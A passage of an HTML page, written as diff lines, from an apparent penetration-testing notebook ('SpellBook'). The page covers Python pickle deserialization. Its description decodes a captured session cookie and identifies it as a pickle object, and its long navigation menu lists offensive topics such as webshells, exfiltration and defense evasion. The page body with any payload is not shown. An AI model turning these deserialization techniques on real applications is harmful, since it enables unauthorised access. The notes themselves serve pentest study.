@@ -1,0 +1,3329 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Python# When we login to this webapp, we got a cookie like this:
+HTTP/1.1 302 Found Set-Cookie: auth_8bH3mjF6n9=gASVSgAAAAAAAACMCXV0aWwuYXV0aJSMB1Nlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwNZnJhbnoubXVlbGxlcpSMBHJvbGWUjAR1c2VylHViLg==We try to base64 decode the cookie and it starts with the bytes 80 04 95 and ends with a period. Compare it to our cheatsheet at #Black-Box, this is python Pickle version 4 serialized object.
+$ echo gASVSgAAAAAAAACMCXV0aWwuYXV0aJSMB1Nlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwNZnJhbnoubXVlbGxlcpSMBHJvbGWUjAR1c2VylHViLg== | base64 -d | xxd 00000000: 8004 954a 0000 0000 0000 008c 0975 7469 ...J.........uti 00000010: 6c2e 6175 7468 948c 0753 6573 7369 6f6e l.auth...Session 00000020: 9493 9429 8194 7d94 288c 0875 7365 726e ...)..}.(..usern 00000030: 616d 6594 8c0d 6672 616e 7a2e 6d75 656c ame...franz.muel 00000040: 6c65 7294 8c04 726f 6c65 948c 0475 7365 ler...role...use 00000050: 7294 7562 2e r.ub.Source Analysis# This is the /login path in app.py. After we log in:
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://rusted-silver.github.io/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/python/">
+  <meta property="og:site_name" content="SpellBook">
+  <meta property="og:title" content="SpellBook">
+  <meta property="og:description" content="Python# When we login to this webapp, we got a cookie like this:
+HTTP/1.1 302 Found Set-Cookie: auth_8bH3mjF6n9=gASVSgAAAAAAAACMCXV0aWwuYXV0aJSMB1Nlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwNZnJhbnoubXVlbGxlcpSMBHJvbGWUjAR1c2VylHViLg==We try to base64 decode the cookie and it starts with the bytes 80 04 95 and ends with a period. Compare it to our cheatsheet at #Black-Box, this is python Pickle version 4 serialized object.
+$ echo gASVSgAAAAAAAACMCXV0aWwuYXV0aJSMB1Nlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwNZnJhbnoubXVlbGxlcpSMBHJvbGWUjAR1c2VylHViLg== | base64 -d | xxd 00000000: 8004 954a 0000 0000 0000 008c 0975 7469 ...J.........uti 00000010: 6c2e 6175 7468 948c 0753 6573 7369 6f6e l.auth...Session 00000020: 9493 9429 8194 7d94 288c 0875 7365 726e ...)..}.(..usern 00000030: 616d 6594 8c0d 6672 616e 7a2e 6d75 656c ame...franz.muel 00000040: 6c65 7294 8c04 726f 6c65 948c 0475 7365 ler...role...use 00000050: 7294 7562 2e r.ub.Source Analysis# This is the /login path in app.py. After we log in:">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="03.-enumeration">
+
+
+  <meta itemprop="name" content="SpellBook">
+  <meta itemprop="description" content="Python# When we login to this webapp, we got a cookie like this:
+HTTP/1.1 302 Found Set-Cookie: auth_8bH3mjF6n9=gASVSgAAAAAAAACMCXV0aWwuYXV0aJSMB1Nlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwNZnJhbnoubXVlbGxlcpSMBHJvbGWUjAR1c2VylHViLg==We try to base64 decode the cookie and it starts with the bytes 80 04 95 and ends with a period. Compare it to our cheatsheet at #Black-Box, this is python Pickle version 4 serialized object.
+$ echo gASVSgAAAAAAAACMCXV0aWwuYXV0aJSMB1Nlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwNZnJhbnoubXVlbGxlcpSMBHJvbGWUjAR1c2VylHViLg== | base64 -d | xxd 00000000: 8004 954a 0000 0000 0000 008c 0975 7469 ...J.........uti 00000010: 6c2e 6175 7468 948c 0753 6573 7369 6f6e l.auth...Session 00000020: 9493 9429 8194 7d94 288c 0875 7365 726e ...)..}.(..usern 00000030: 616d 6594 8c0d 6672 616e 7a2e 6d75 656c ame...franz.muel 00000040: 6c65 7294 8c04 726f 6c65 948c 0475 7365 ler...role...use 00000050: 7294 7562 2e r.ub.Source Analysis# This is the /login path in app.py. After we log in:">
+  <meta itemprop="wordCount" content="774">
+
+<title>Python | SpellBook</title>
+<link rel="icon" href="/spellbook/favicon.png" >
+<link rel="manifest" href="/spellbook/manifest.json">
+<link rel="canonical" href="https://rusted-silver.github.io/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/python/">
+<link rel="stylesheet" href="/spellbook/book.min.8be08ee19c78fece5778ccbad7b7920c47943153ee0c9e856094873c56dca415.css" integrity="sha256-i&#43;CO4Zx4/s5XeMy617eSDEeUMVPuDJ6FYJSHPFbcpBU=" crossorigin="anonymous">
+
+
+  <script defer src="/spellbook/fuse.min.js"></script>
+  <script defer src="/spellbook/en.search.min.5ba98d1a9d6abff7b5da47d3a9a39a720a0e32df83c349f0e060f2b59a2c20ca.js" integrity="sha256-W6mNGp1qv/e12kfTqaOacgoOMt&#43;Dw0nw4GDytZosIMo=" crossorigin="anonymous"></script>
+
+
+
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-03.-enumeration">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/spellbook/"><span>SpellBook</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+<ul><li><a href="/spellbook/">&lt;- Back to main page</a></li></ul>
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-3e8dfd6811139b26df71dcc7c1ec8a71" class="toggle"  />
+    <label for="section-3e8dfd6811139b26df71dcc7c1ec8a71" class="flex">
+      <a role="button" class="">
+        01. Passive Recon</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/bug-bounty-dorks/" class="">
+      Bug Bounty Dorks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/dns/" class="">
+      DNS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/public-s3-buckets/" class="">
+      Public S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/source-code/" class="">
+      Source Code</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/subdomain-enumeration/" class="">
+      Subdomain Enumeration</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-620ac26c1d74d3712f5771bd92ea1cd1" class="toggle"  />
+    <label for="section-620ac26c1d74d3712f5771bd92ea1cd1" class="flex">
+      <a role="button" class="">
+        02. Active Recon</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/02.-active-recon/port-scan/" class="">
+      Port Scan</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/02.-active-recon/web---assets-enumeration/" class="">
+      Web Assets Enumeration</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-1eb6d1276e5402b7759fe597792fed3e" class="toggle" checked />
+    <label for="section-1eb6d1276e5402b7759fe597792fed3e" class="flex">
+      <a role="button" class="">
+        03. Enumeration</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-da1ecbb0229a70dd5366fa770cbcdbf8" class="toggle" checked />
+    <label for="section-da1ecbb0229a70dd5366fa770cbcdbf8" class="flex">
+      <a role="button" class="">
+        80,443 Tcp HTTP</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6121218ae46d8375829819d014e3b5f5" class="toggle"  />
+    <label for="section-6121218ae46d8375829819d014e3b5f5" class="flex">
+      <a role="button" class="">
+        Common Vulnerability</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/basic-http-auth/" class="">
+      Basic HTTP Auth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/blind-sqli/" class="">
+      Blind SQL I</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/code-injection/" class="">
+      Code Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/csrf/" class="">
+      Csrf</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/file-upload/" class="">
+      File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/graphql/" class="">
+      Graph Ql</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/idor/" class="">
+      ID Or</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/jwt/" class="">
+      JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/lfi/" class="">
+      Lfi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/oauth/" class="">
+      Oauth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/pdf-generation-injection/" class="">
+      Pdf Generation Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/saml/" class="">
+      Saml</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/sql-injection/" class="">
+      SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/ssrf/" class="">
+      Ssrf</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/template-injection-ssti/" class="">
+      Template Injection ( Ssti)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/websocket/" class="">
+      Websocket</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/xss/" class="">
+      Xss</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/xxe/" class="">
+      Xxe</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-063b6da821fbfa4b9fcb65163a5b31d8" class="toggle"  />
+    <label for="section-063b6da821fbfa4b9fcb65163a5b31d8" class="flex">
+      <a role="button" class="">
+        Rare Vulnerabilities</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/cache-poisoning/" class="">
+      Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/crlf-injection/" class="">
+      Crlf Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/hosts-header-attacks/" class="">
+      Hosts Header Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/ldap-injection/" class="">
+      Ldap Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/mongodb-injection/" class="">
+      Mongodb Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/padding-oracles/" class="">
+      Padding Oracles</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/request-smuggling/" class="">
+      Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/session-puzzling/" class="">
+      Session Puzzling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/ssi-injection/" class="">
+      Ssi Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/tls-ssl-attacks/" class="">
+      Tls ( Ssl) Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/xpath-injection/" class="">
+      Xpath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/xslt-injection/" class="">
+      Xslt Injection</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2e09e512163cdc60fcb006584b888a87" class="toggle"  />
+    <label for="section-2e09e512163cdc60fcb006584b888a87" class="flex">
+      <a role="button" class="">
+        Webapps Specific</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/drupal/" class="">
+      Drupal</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/gitlab/" class="">
+      Git Lab</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/jenkins/" class="">
+      Jenkins</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/joomla/" class="">
+      Joomla</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/nexus-repository-manager/" class="">
+      Nexus Repository Manager</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/prtg/" class="">
+      Prtg</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/splunk/" class="">
+      Splunk</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/tomcat/" class="">
+      Tomcat</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/wordpress/" class="">
+      Word Press</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-5de4a0e2a064acde43bb919dbfcee93b" class="toggle" checked />
+    <label for="section-5de4a0e2a064acde43bb919dbfcee93b" class="flex">
+      <a role="button" class="">
+        Whitebox</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c6aacb94aa4d41ce7a7f6743146af7cc" class="toggle" checked />
+    <label for="section-c6aacb94aa4d41ce7a7f6743146af7cc" class="flex">
+      <a role="button" class="">
+        Deserialization</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/asp.net/" class="">
+      Asp. Net</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/introduction/" class="">
+      Introduction</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/php/" class="">
+      Php</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/python/" class="active">
+      Python</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/decompilation-tools/" class="">
+      Decompilation Tools</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/iis-installation/" class="">
+      Iis Installation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/prototype-pollution/" class="">
+      Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/type-juggling/" class="">
+      Type Juggling</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/http-common-sense/" class="">
+      HTTP Common Sense</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/https-exfiltration-server/" class="">
+      HTTP S Exfiltration Server</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/scripts/" class="">
+      Scripts</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webshells/" class="">
+      Webshells</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/110995-tcp---pop3/" class="">
+      110,995 Tcp POP3</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/1151-tcp---oracle-db/" class="">
+      1151 Tcp Oracle Db</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/143993-tcp---imap/" class="">
+      143,993 Tcp IMAP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/1433-tcp---mssql/" class="">
+      1433 Tcp Mssql</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/1611621016110162-udp---snmp/" class="">
+      161,162,10161,10162 UDP SNMP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/2049-tcp---nfs/" class="">
+      2049 Tcp Nfs</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/21-tcp---ftp/" class="">
+      21 Tcp FTP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/25465587-tcp---smtp/" class="">
+      25,465,587 Tcp SMTP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/27017-tcp---mongodb/" class="">
+      27017 Tcp Mongodb</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/3306-tcp---mysql/" class="">
+      3306 Tcp My SQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/4222-tcp---nats/" class="">
+      4222 Tcp NAT S</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/445-tcp---smb/" class="">
+      445 Tcp Smb</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/623-udp---ipmi/" class="">
+      623 UDP IP Mi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/873-tcp---rsync/" class="">
+      873 Tcp Rsync</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/default-credentials/" class="">
+      Default Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/r-services/" class="">
+      R Services</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2c69393f67cd7496c728f5b58e6ac1ee" class="toggle"  />
+    <label for="section-2c69393f67cd7496c728f5b58e6ac1ee" class="flex">
+      <a role="button" class="">
+        04. Initial Access</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/04.-initial-access/rdp/" class="">
+      Rdp</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/04.-initial-access/smb/" class="">
+      Smb</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/04.-initial-access/timeroasting/" class="">
+      Timeroasting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/04.-initial-access/winrm/" class="">
+      Win Rm</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-90c5584e370531caff111fc923627531" class="toggle"  />
+    <label for="section-90c5584e370531caff111fc923627531" class="flex">
+      <a role="button" class="">
+        05. Defense Evasion</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/applocker/" class="">
+      Applocker</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/defender/" class="">
+      Defender</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/firewall/" class="">
+      Firewall</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/powershell/" class="">
+      Powershell</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/restriced-shell/" class="">
+      Restriced Shell</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-07e5596a0ace078f0cf9976d44537c29" class="toggle"  />
+    <label for="section-07e5596a0ace078f0cf9976d44537c29" class="flex">
+      <a role="button" class="">
+        06. Privilege Escalation</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-085f8e8a106aad5123071eb91320ad16" class="toggle"  />
+    <label for="section-085f8e8a106aad5123071eb91320ad16" class="flex">
+      <a role="button" class="">
+        Linux</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2ea21e955d87b2e3ef58a7e330eeac1f" class="toggle"  />
+    <label for="section-2ea21e955d87b2e3ef58a7e330eeac1f" class="flex">
+      <a role="button" class="">
+        Cve</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/cve/dirty-pipe/" class="">
+      Dirty Pipe</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/cve/logrotate/" class="">
+      Logrotate</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/cve/netfilter/" class="">
+      Netfilter</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/cve/sudo-cve/" class="">
+      Sudo Cve</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ed5af43f9c413fcde5c865f6213099b9" class="toggle"  />
+    <label for="section-ed5af43f9c413fcde5c865f6213099b9" class="flex">
+      <a role="button" class="">
+        Privileged Groups</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/privileged-groups/adm/" class="">
+      Adm</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/privileged-groups/docker/" class="">
+      Docker</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/privileged-groups/lxc/" class="">
+      Lxc</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/credential-search/" class="">
+      Credential Search</a>
+  
+
+        </li>
+      
+    
+      
